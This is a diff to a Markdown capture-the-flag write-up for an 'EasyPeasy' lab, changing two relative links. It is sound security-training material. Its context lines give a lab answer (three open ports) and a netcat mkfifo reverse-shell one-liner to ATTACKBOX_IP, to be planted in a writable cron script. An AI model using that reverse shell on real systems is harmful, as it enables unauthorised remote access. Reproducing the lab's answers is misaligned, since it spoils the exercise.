@@ -29,7 +29,7 @@ Now that we have an understanding of what the nmap scan is doing, we can move on
 #### Results Analysis/Answering The Task Questions
 **Question 1: How many ports are open?**  
 
-If we take a look at the nmap scan results [above](EasyPeasy.md#step-1-nmap-scan).   
+If we take a look at the nmap scan results [above](/writeups/EasyPeasy.md#step-1-nmap-scan).   
 We can find that ports 80, 6498, and 65524 are open. Thus, the answer to this question is 3.  
 **Answer: 3**   
 
@@ -231,7 +231,7 @@ anacrontab and crontab are files while the others are directories. I used cat on
 
 It looks like there's a bash file in `/var/www/` that gets run periodically specifically every minute. This looks like the cronjob vulnerability that we were looking for. I run nano on it using `nano /var/www/.mysecretcronjob.sh` since vim isn't installed on the machine and find that it is indeed writable. Eureka.  
 
-Now for some exploiting. We'll be setting up a Reverse Shell using netcat. To do that, we'll need to add this line `rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKBOX_IP 4444 >/tmp/f` to the `.mysecretcronjob.sh` file. Along with running the command `netcat -lvnp 4444` on our own machine, we'll have our reverse shell up and running the next time this cronjob is run. For more detailed breakdown of the commands click [here](EasyPeasy.md#cronjob-detailed-breakdown).  
+Now for some exploiting. We'll be setting up a Reverse Shell using netcat. To do that, we'll need to add this line `rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKBOX_IP 4444 >/tmp/f` to the `.mysecretcronjob.sh` file. Along with running the command `netcat -lvnp 4444` on our own machine, we'll have our reverse shell up and running the next time this cronjob is run. For more detailed breakdown of the commands click [here](/writeups/EasyPeasy.md#cronjob-detailed-breakdown).  
 
 After a bit of waiting, this is what I received on my netcat listener. I ran whoami to make sure it was working properly.  
 
